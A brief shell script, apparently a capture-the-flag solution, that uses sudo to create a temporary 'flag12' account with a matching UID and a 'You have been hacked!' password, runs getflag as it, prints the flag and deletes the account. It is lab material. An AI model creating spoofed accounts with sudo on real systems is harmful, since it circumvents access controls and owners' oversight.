#!/bin/sh -eu

sudo useradd \
  --no-create-home \
  --no-user-group \
  --password '💀 You have been hacked! 💀' \
  --uid 3012 \
  flag12
echo -n 'flag12: '
sudo -u flag12 getflag | egrep -o '[^ ]+$'
sudo userdel flag12
